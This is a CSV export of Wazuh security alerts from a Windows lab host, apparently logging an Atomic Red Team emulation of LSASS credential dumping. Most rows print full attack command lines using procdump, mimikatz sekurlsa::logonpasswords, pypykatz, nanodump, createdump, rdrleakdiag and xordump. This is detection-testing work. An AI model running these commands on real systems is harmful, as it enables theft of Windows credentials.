timestamp,agent.name,rule.description,rule.level,rule.id,data.win.eventdata.commandLine,data.win.eventdata.image,data.win.eventdata.parentImage,data.win.system.computer
"Jun 19, 2026 @ 12:10:20.273",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""MinimumPasswordLength\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 12:09:49.731",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""MinimumPasswordAge\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 12:09:19.532",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""MaximumPasswordAge\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 12:08:49.220",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""MaximumPasswordAge\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 12:08:21.826",Win-Victim,Powershell was used to delete files or directories,3,92021,"powershell secedit /export /cfg $env:TEMP\\secpol.cfg; Get-Content $env:TEMP\\secpol.cfg | Select-String \""PasswordHistorySize\""; Remove-Item $env:TEMP\\secpol.cfg",C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Program Files (x86)\\ossec-agent\\wazuh-agent.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 12:02:51.317",Win-Victim,Application Compatibility Database launched,12,92058,C:\\WINDOWS\\System32\\sdbinst.exe -m -bg,C:\\Windows\\System32\\sdbinst.exe,C:\\Windows\\System32\\svchost.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:02:50.767",Win-Victim,Application Compatibility Database launched,12,92058,C:\\WINDOWS\\System32\\sdbinst.exe -m -bg,C:\\Windows\\System32\\sdbinst.exe,C:\\Windows\\System32\\svchost.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:01:11.556",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe  --silent-process-exit \""C:\\Users\\anshio\\AppData\\Local\\Temp\\SilentProcessExit\""",C:\\AtomicRedTeam\\ExternalPayloads\\nanodump.x64.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:01:11.544",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \""%%temp%%\\SilentProcessExit\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:01:10.028",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""powershell.exe\"" &amp; {if (Test-Path -Path \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\System32\\rdrleakdiag.exe\\\""\""   } elseif (Test-Path -Path \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\"") {       $binary_path = \\\""\""$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\\\""\""   } else {       $binary_path = \\\""\""File not found\\\""\""       exit 1   } $lsass_pid = get-process lsass |select -expand id if (-not (Test-Path -Path\\\""\""$env:TEMP\\t1003.001-13-rdrleakdiag\\\""\"")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force}  write-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 &amp; $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1 Write-Host \\\""\""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\\\""\""}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:01:08.620",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""powershell.exe\"" &amp; {C:\\Windows\\Temp\\xordump.exe -out C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp -x 0x41}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:01:08.546",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.17\\createdump.exe\"" -u -f C:\\Users\\anshio\\AppData\\Local\\Temp\\dotnet-lsass.dmp 804",C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.0.17\\createdump.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:01:07.252",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""powershell.exe\"" &amp; {$exePath =  resolve-path \\\""\""$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\\\""\"" &amp; \\\""\""$exePath\\\""\"" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id}",C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:01:00.131",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe  -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp,C:\\AtomicRedTeam\\ExternalPayloads\\procdump.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:01:00.127",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\procdump.exe\"" -accepteula -mm lsass.exe C:\\Windows\\Temp\\lsass_dump.dmp",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:57.637",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"C:\\WINDOWS\\system32\\cmd.exe /c \""ver\""",C:\\Windows\\System32\\cmd.exe,C:\\Program Files\\Python310\\python.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:56.610",Win-Victim,Suspicious Windows cmd shell execution,3,92032,C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz  live lsa,C:\\AtomicRedTeam\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:56.610",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\venv_t1003_001\\Scripts\\pypykatz\"" live lsa",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:56.593",Win-Victim,Possible LSASS credential dumping tool executed on DESKTOP-TEK25BV,13,100212,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\x64\\mimikatz.exe\"" \""sekurlsa::minidump %%tmp%%\\lsass.DMP\"" \""sekurlsa::logonpasswords full\"" exit",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:56.576",Win-Victim,Suspicious Windows cmd shell execution,3,92032,"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe  -w \""C:\\Users\\anshio\\AppData\\Local\\Temp\\nanodump.dmp\""",C:\\AtomicRedTeam\\ExternalPayloads\\nanodump.x64.exe,C:\\Windows\\System32\\cmd.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:56.544",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\nanodump.x64.exe -w \""%%temp%%\\nanodump.dmp\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
"Jun 19, 2026 @ 11:00:56.535",Win-Victim,Windows command prompt started by an abnormal process,4,92052,"\""cmd.exe\"" /c \""C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\Outflank-Dumpert.exe\""",C:\\Windows\\System32\\cmd.exe,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,DESKTOP-TEK25BV
